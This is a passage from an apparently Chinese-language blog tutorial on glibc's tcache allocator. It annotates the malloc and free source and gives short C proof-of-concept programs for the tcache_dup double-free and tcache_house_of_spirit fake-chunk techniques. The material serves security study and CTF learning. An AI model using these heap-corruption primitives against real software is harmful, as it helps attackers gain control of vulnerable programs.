class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (get_max_fast ()))</span><br><span class="line">    &#123;</span><br><span class="line">      idx = fastbin_index (nb);</span><br><span class="line">      mfastbinptr *fb = &amp;fastbin (av, idx);</span><br><span class="line">      mchunkptr pp;</span><br><span class="line">      victim = *fb;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (victim != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">	    *fb = victim-&gt;fd;</span><br><span class="line">	  <span class="keyword">else</span></span><br><span class="line">	    REMOVE_FB (fb, pp, victim);</span><br><span class="line">	  <span class="keyword">if</span> (__glibc_likely (victim != <span class="literal">NULL</span>))</span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="keyword">size_t</span> victim_idx = fastbin_index (chunksize (victim));</span><br><span class="line">	      <span class="keyword">if</span> (__builtin_expect (victim_idx != idx, <span class="number">0</span>))</span><br><span class="line">		malloc_printerr (<span class="string">"malloc(): memory corruption (fast)"</span>);</span><br><span class="line">	      check_remalloced_chunk (av, victim, nb);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line"></span><br><span class="line">	      <span class="keyword">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">	      <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)   <span class="comment">// 把该 fastbin 里面其他的 bin 放到 tcache 里面</span></span><br><span class="line">		&#123;</span><br><span class="line">		  mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">		  <span class="comment">/* While bin not empty and tcache not full, copy chunks.  */</span></span><br><span class="line">		  <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count  <span class="comment">// 判断 tcache 中指定 bin 中 chunk 是否超过 7</span></span><br><span class="line">			 &amp;&amp; (tc_victim = *fb) != <span class="literal">NULL</span>)</span><br><span class="line">		    &#123;</span><br><span class="line">		      <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">			*fb = tc_victim-&gt;fd;</span><br><span class="line">		      <span class="keyword">else</span></span><br><span class="line">			&#123;</span><br><span class="line">			  REMOVE_FB (fb, pp, tc_victim);</span><br><span class="line">			  <span class="keyword">if</span> (__glibc_unlikely (tc_victim == <span class="literal">NULL</span>))</span><br><span class="line">			    <span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		      tcache_put (tc_victim, tc_idx);</span><br><span class="line">		    &#125;</span><br><span class="line">		&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	      <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">	      alloc_perturb (p, bytes);</span><br><span class="line">	      <span class="keyword">return</span> p;</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>在 相应 <code>fastbin</code> 找到 合适的 <code>chunk</code> 后，就把 该 <code>chunk</code> 从 <code>fastbin</code> 里面拿下来</li>
<li>然后 把相应 <code>fastbin</code> 里面剩下的 <code>chunk</code> 全都放到 <code>tcache</code> 里面 ， 直到 <code>tcache-&gt;entries[tc_idx]</code> 满了 (已经有 <code>7</code> 个 <code>chunk</code> 了，即 <code>tcache-&gt;counts[tc_idx] = mp_.tcache_count = 7</code> ）。</li>
<li>最后在返回一开始拿到的 <code>chunk</code> 给用户</li>
</ul>
<p>如果 <code>fastbin</code> 不能分配，则进入 <code>smallbin</code> 的分配流程</p>
<h4 id="处理-smallbin"><a href="#处理-smallbin" class="headerlink" title="处理 smallbin"></a>处理 smallbin</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">    &#123;</span><br><span class="line">      idx = smallbin_index (nb);</span><br><span class="line">      bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((victim = last (bin)) != bin)</span><br><span class="line">        &#123;</span><br><span class="line">          bck = victim-&gt;bk;</span><br><span class="line">	  <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">	    malloc_printerr (<span class="string">"malloc(): smallbin double linked list corrupted"</span>);</span><br><span class="line">          set_inuse_bit_at_offset (victim, nb);</span><br><span class="line">          bin-&gt;bk = bck; </span><br><span class="line">          bck-&gt;fd = bin;  <span class="comment">// 找到 chunk ， 从 smallbin拿下来准备返回给用户</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">	    set_non_main_arena (victim);</span><br><span class="line">          check_malloced_chunk (av, victim, nb);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">	  <span class="comment">/* While we're here, if we see other chunks of the same size, // 把指定 smallbin 里面的 bin扔到 tcache里面</span></span><br><span class="line"><span class="comment">	     stash them in the tcache.  */</span></span><br><span class="line">	  <span class="keyword">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">	  <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">	    &#123;</span><br><span class="line">	      mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">	      <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">	      <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">		     &amp;&amp; (tc_victim = last (bin)) != bin)</span><br><span class="line">		&#123;</span><br><span class="line">		  <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">		    &#123;</span><br><span class="line">		      bck = tc_victim-&gt;bk;</span><br><span class="line">		      set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class="line">		      <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">			set_non_main_arena (tc_victim);</span><br><span class="line">		      bin-&gt;bk = bck;</span><br><span class="line">		      bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">		      tcache_put (tc_victim, tc_idx);</span><br><span class="line">	            &#125;</span><br><span class="line">		&#125;</span><br><span class="line">	    &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">          <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>和 <code>fastbin</code> 是类似的操作， 在 <code>size</code> 对应的 <code>smallbin</code> 里面找到 <code>chunk</code> 后</p>
<p>把这个 <code>chunk</code> 从链表上取下来</p>
<p>然后把该 <code>smallbin</code> 里面剩下的 <code>bin</code> 放入到 <code>tcache</code> ， 直到 <code>tcache-&gt;entries[tc_idx]</code> 满.</p>
<p>如果 <code>smallbin</code> 也没能分配，进入 <code>unsorted bin</code></p>
<h4 id="遍历unsorted-bin"><a href="#遍历unsorted-bin" class="headerlink" title="遍历unsorted bin"></a>遍历unsorted bin</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">int</span> iters = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))</span><br><span class="line">        &#123;</span><br><span class="line">          ....................</span><br><span class="line">          ....................</span><br><span class="line">          ....................</span><br><span class="line">          <span class="comment">/* remove from unsorted list */</span></span><br><span class="line">          unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">          bck-&gt;fd = unsorted_chunks (av);</span><br><span class="line">          <span class="comment">// 把 bin 从 unsorted bin 里面拿下来后，先放入 tcache </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">	     <span class="comment">// 如果unsorted bin 的大小正好，扔到 tcache ，然后继续遍历</span></span><br><span class="line">		 We may <span class="keyword">return</span> one of these chunks later.  */</span><br><span class="line">	      <span class="keyword">if</span> (tcache_nb</span><br><span class="line">		  &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">		&#123;</span><br><span class="line">		  tcache_put (victim, tc_idx);</span><br><span class="line">		  return_cached = <span class="number">1</span>;</span><br><span class="line">		  <span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	      <span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">#endif</span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">		&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">         <span class="comment">//大小不刚好等于需要的size 的话，就把 bin放到 相应的 bin 里面。</span></span><br><span class="line">         .......................................</span><br><span class="line">         .......................................</span><br><span class="line">         .......................................</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">      <span class="comment">//如果有 大小适配的 unsorted bin 进入了 tcache(return_cached=1) 同时 mp_.tcache_unsorted_limit &gt; 0 默认为 0 ，不会进入分支, 继续遍历 </span></span><br><span class="line">      ++tcache_unsorted_count;</span><br><span class="line">      <span class="keyword">if</span> (return_cached</span><br><span class="line">	  &amp;&amp; mp_.tcache_unsorted_limit &gt; <span class="number">0</span></span><br><span class="line">	  &amp;&amp; tcache_unsorted_count &gt; mp_.tcache_unsorted_limit)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">         .......................................</span><br><span class="line">         .......................................</span><br><span class="line">         .......................................</span><br><span class="line">         &#125; <span class="comment">// end of  while ((victim = unsorted_chunks (av)-&gt;b</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//遍历完 unsorted bin 后 ，根据 return_cached 判断 tcache 里面是否有合适的 chunk</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">      <span class="comment">/* If all the small chunks we found ended up cached, return one now.  */</span></span><br><span class="line">      <span class="keyword">if</span> (return_cached)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure>
<ul>
<li>在遍历 <code>unsorted bin</code> 的时候， 如果找到大小刚好满足的 <code>bin</code> ， 不会立刻返回，而是把这个 <code>bin</code> 放入 <code>tcache</code> 里面，并且设置 <code>return_cached=1</code> ，表示 有 大小适配的 <code>unsorted bin</code> 进入了 <code>tcache</code></li>
<li>如果大小不是正好满足需要，就走一般的流程，把 <code>bin</code> 放到相应的 <code>smallbin</code> 或者 <code>largebin</code> 里面</li>
<li>遍历 <code>unsorted bin</code> 的最后，会根据 <code>return_cached</code> 判断是否有 大小适配的 <code>unsorted bin</code> 进入了 <code>tcache</code> ， <code>mp_.tcache_unsorted_limit</code> 默认为 <code>0</code> ，所以不会进入分支， 这样就会把所有的 <code>unsorted bin</code> 都放入到 <code>tcache</code>。</li>
<li>遍历完 <code>unsorted bin</code> 后 ，根据 <code>return_cached</code> 判断 <code>tcache</code> 里面是否有合适的 <code>chunk</code> ，有的话就可以返回了</li>
<li>否则 <code>large bin</code> ，<code>top chunk</code> 来分配</li>
</ul>
<h2 id="tcache-in-free"><a href="#tcache-in-free" class="headerlink" title="tcache in free"></a>tcache in free</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">_int_free (mstate av, mchunkptr p, <span class="keyword">int</span> have_lock)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  size = chunksize (p);</span><br><span class="line">  check_inuse_chunk(av, p);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">size_t</span> tc_idx = csize2tidx (size);  <span class="comment">// tcache bin 的索引</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (tcache</span><br><span class="line">	&amp;&amp; tc_idx &lt; mp_.tcache_bins  <span class="comment">// 64 ，最多 64 个 bin</span></span><br><span class="line">	&amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)  <span class="comment">// 7 ，tcache-&gt;counts 存放每个 bin 已经存放的 chunk数量</span></span><br><span class="line">      &#123;</span><br><span class="line">	tcache_put (p, tc_idx);</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure>
<p>删掉了一些没影响的代码</p>
<ul>
<li>首先就是获取要释放的 <code>chunk</code> 的 <code>size</code> , 然后判断 <code>size</code> 是否符和规范（是否对齐之类的 <code>check</code> )， 如果合规就看 <code>tcache-&gt;counts[tc_idx]</code> 是否已经满了 ，如果没有满就直接放入 <code>tcache</code> ， 然后返回。</li>
<li>否则就和没有 <code>tcache</code> 是一样的处理</li>
</ul>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>在 <code>free</code> 的时候，会检测 <code>p</code> 的下一个 <code>chunk( next )</code> 的 <code>PREV_INUSE</code> 位，但是如果 <code>chunk</code> 被放入了 tcache ，<code>next-&gt;PREV_INUSE</code> 位不会被修改 ，所以还是会标志为 <code>in_used</code> . 所以我们可以 <strong>多次释放同一个 <code>chunk</code> .</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">  size = chunksize (p);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect ((<span class="keyword">uintptr_t</span>) p &gt; (<span class="keyword">uintptr_t</span>) -size, <span class="number">0</span>)</span><br><span class="line">      || __builtin_expect (misaligned_chunk (p), <span class="number">0</span>))</span><br><span class="line">    malloc_printerr (<span class="string">"free(): invalid pointer"</span>);</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (size &lt; MINSIZE || !aligned_OK (size)))</span><br><span class="line">    malloc_printerr (<span class="string">"free(): invalid size"</span>);</span><br><span class="line"></span><br><span class="line">  check_inuse_chunk(av, p); <span class="comment">// 通过下一个 chunk 的 pre_inused 位，判断当前 chunk 释放已经被释放</span></span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">size_t</span> tc_idx = csize2tidx (size);  <span class="comment">// tcache bin 的索引</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (tcache</span><br><span class="line">	&amp;&amp; tc_idx &lt; mp_.tcache_bins  <span class="comment">// 64 ，最多 64 个 bin</span></span><br><span class="line">	&amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)  <span class="comment">// 7 ，tcache-&gt;counts 存放每个 bin 已经存放的 chunk数量</span></span><br><span class="line">      &#123;</span><br><span class="line">	tcache_put (p, tc_idx);  <span class="comment">// 如果 chunk 被放入了 tcache ，next-&gt;pre_inuse 不会被修改。</span></span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure>
<p>同时在 <code>malloc</code> 的时候 ，先尝试 <code>tcache</code> 分配</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> *</span><br><span class="line">__libc_malloc (<span class="keyword">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="keyword">size_t</span> tbytes;</span><br><span class="line">  checked_request2size (bytes, tbytes);</span><br><span class="line">  <span class="keyword">size_t</span> tc_idx = csize2tidx (tbytes);</span><br><span class="line">  <span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins</span><br><span class="line">      &amp;&amp; tcache</span><br><span class="line">      &amp;&amp; tcache-&gt;entries[tc_idx] != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure>
<p>这也使得很多安全检测不会被执行。</p>
<h2 id="tcache-dup"><a href="#tcache-dup" class="headerlink" title="tcache_dup"></a>tcache_dup</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>通过 <code>free</code> 2次同一个 <code>chunk</code> ， 使得可以让两个指针分配到同一块内存</p>
<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">void</span>* p1 = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">        <span class="built_in">free</span>(p1);</span><br><span class="line">        <span class="built_in">free</span>(p1);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Next allocated memory will be same: %p %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">0x40</span>), <span class="built_in">malloc</span>(<span class="number">0x40</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>通过 <code>_int_free</code> 的源码我们知道， 在 <code>free</code> 的时候，会检测 <code>p</code> 的下一个 <code>chunk</code> ( <code>next</code> ) 的 <code>PREV_INUSE</code> 位</li>
<li>然后如果 <code>tcache</code> 指定项没有满就把 <code>chunk</code> 加入 <code>tcache</code></li>
<li>但是如果 <code>chunk</code> 被放入了 <code>tcache</code> ，<code>next-&gt;PREV_INUSE</code> 位不会被修改 ，所以还是会标志为 <code>in_used</code> . 所以我们可以 <strong>多次释放同一个 <code>chunk</code> .</strong></li>
</ul>
<p>所以我们释放两次 <code>p1</code> , 此时 <code>tcache</code> 里面 <code>size</code> 为 <code>0x50</code> ( <code>chunk</code> 大小) 的项中就有 两个 一样 <code>chunk</code></p>
<p>然后分配两次一样大小的 <code>chunk</code>， <code>malloc</code> 会先用 <code>tcache</code> 分配，就会拿到两个一样的 <code>chunk</code></p>
<p>可以看到分配到了两个地址一样的 <code>chunk</code> .</p>
<h2 id="tcache-house-of-spirit"><a href="#tcache-house-of-spirit" class="headerlink" title="tcache_house_of_spirit"></a>tcache_house_of_spirit</h2><h3 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h3><p>通过伪造 <code>size</code> ，然后 <code>free</code> 掉这个 伪造的 <code>chunk</code> , 然后再分配 <code>size</code> 大小的 <code>chunk</code> , 就可以分配到指定位置。</p>
<h3 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h3><p>首先看看源代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span>* argv[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> fake_chunk_and_more[<span class="number">64</span>];</span><br><span class="line">    <span class="built_in">memset</span>(fake_chunk_and_more, <span class="string">'A'</span>, <span class="keyword">sizeof</span>(fake_chunk_and_more));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"stack buf: %p\n"</span>, (<span class="keyword">void</span> *)fake_chunk_and_more);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">char</span>* fake_chunk = (<span class="keyword">char</span> * )fake_chunk_and_more;</span><br><span class="line">    *(<span class="keyword">long</span> *)(fake_chunk + <span class="keyword">sizeof</span>(<span class="keyword">long</span>)) = <span class="number">0x110</span>;</span><br><span class="line"></span><br><span class="line">    *(<span class="keyword">long</span> *)(fake_chunk + <span class="number">0x110</span> + <span class="keyword">sizeof</span>(<span class="keyword">long</span>)) = <span class="number">0x40</span>;  <span class="comment">// 设置 pre_inused 位</span></span><br><span class="line">    <span class="keyword">char</span> *mem = fake_chunk + <span class="number">2</span>*<span class="keyword">sizeof</span>(<span class="keyword">long</span>);</span><br><span class="line">    <span class="built_in">free</span>(mem);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">void</span> *mem2 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"malloc(0x100) returned: %p\n"</span>, mem2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>就是在栈上面（用栈只是为了方便）伪造了 一个 <code>0x110</code> 大小 <code>chunk</code>，</p>
<p>然后把它释放掉，他就会进入 <code>tcache</code> ,然后分配 <code>0x110</code> 的 <code>chunk</code> 就可以 分配到 <code>fake_chunk_and_more</code> 的地址</p>
<p>可以看到分配到了<code>fake_chunk_and_more</code> .</p>
<p>调试过程的内存状态</p>
<p>熟悉 <code>malloc</code> 管理机制的老哥们可以比较奇怪，这里把 <code>next_chunk-&gt;pre_inused = 0</code> ( <code>size = 0x40</code> ) 。</p>
<p>在 源码里面是有通过 <code>check_inuse_chunk</code> 检测是否 <code>double free</code> 的 代码的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">_int_free (mstate av, mchunkptr p, <span class="keyword">int</span> have_lock)</span><br><span class="line">&#123;</span><br><span class="line">  size = chunksize (p);</span><br><span class="line">  ....................................................</span><br><span class="line">  ....................................................</span><br><span class="line">  check_inuse_chunk(av, p);</span><br><span class="line">  <span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">size_t</span> tc_idx = csize2tidx (size);  <span class="comment">// tcache bin 的索引</span></span><br><span class="line">    <span class="keyword">if</span> (tcache</span><br><span class="line">	&amp;&amp; tc_idx &lt; mp_.tcache_bins  <span class="comment">// 64 ，最多 64 个 bin</span></span><br><span class="line">	&amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)  <span class="comment">// 7 ，tcache-&gt;counts 存放每个 bin 已经存放的 chunk数量</span></span><br><span class="line">      &#123;</span><br><span class="line">	tcache_put (p, tc_idx);</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure>
<p>但是从 <code>ida</code> 里面去看，居然不见了，校验 <code>chunk</code> 的 <code>size</code> 和 指针 后就直接进入 <code>tcache</code> 的处理的流程， 于是这里就算设置 下一个<code>chunk</code> 的 <code>next_chunk-&gt;pre_inuse = 0</code> ,也不会出现 <code>crash</code> 。</p>
